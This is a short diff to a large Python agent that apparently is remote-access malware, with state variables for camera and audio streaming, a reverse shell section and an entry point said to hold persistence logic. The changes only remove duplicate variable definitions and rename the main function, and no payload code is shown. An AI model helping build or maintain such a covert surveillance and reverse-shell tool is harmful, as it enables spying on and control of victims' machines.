@@ -3497,15 +3497,9 @@ def sleep_random_non_blocking():
         sleep_time = random.uniform(0.1, 0.5)  # Much shorter fallback
         time.sleep(sleep_time)
 
-# --- Agent State ---
-STREAMING_ENABLED = False
-STREAM_THREAD = None
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREAD = None
-CAMERA_STREAMING_ENABLED = False
-CAMERA_STREAM_THREADS = []
-camera_capture_queue = None
-camera_encode_queue = None
+# --- Agent State (consolidated with earlier definitions) ---
+# Note: These variables are already defined earlier in the file
+# Removed duplicate definitions to prevent conflicts
 
 # --- Reverse Shell State ---
 REVERSE_SHELL_ENABLED = False
@@ -3739,10 +3733,8 @@ def stream_camera_h264_socketio(agent_id):
 # Legacy HTTP POST audio streaming removed - now using Opus socket.io binary streaming
 
 # Modern Opus audio streaming pipeline variables
-AUDIO_STREAMING_ENABLED = False
-AUDIO_STREAM_THREADS = []
-audio_capture_queue = None
-audio_encode_queue = None
+# Note: AUDIO_STREAMING_ENABLED and related variables are already defined earlier
+# Removed duplicate definitions to prevent conflicts
 
 # Note: TARGET_AUDIO_FPS, AUDIO_CAPTURE_QUEUE_SIZE and AUDIO_ENCODE_QUEUE_SIZE are defined globally
 
@@ -9505,9 +9497,9 @@ if __name__ == "__main__":
         log_message("  ✓ Enhanced performance tuning & monitoring")
         log_message("=" * 60)
     
-    # CRITICAL FIX: Call agent_main() which contains the persistence logic
+    # CRITICAL FIX: Call main_unified() which contains the persistence logic
     try:
-        agent_main()
+        main_unified()
     except KeyboardInterrupt:
         log_message("System shutdown requested.")
     except ImportError as e:
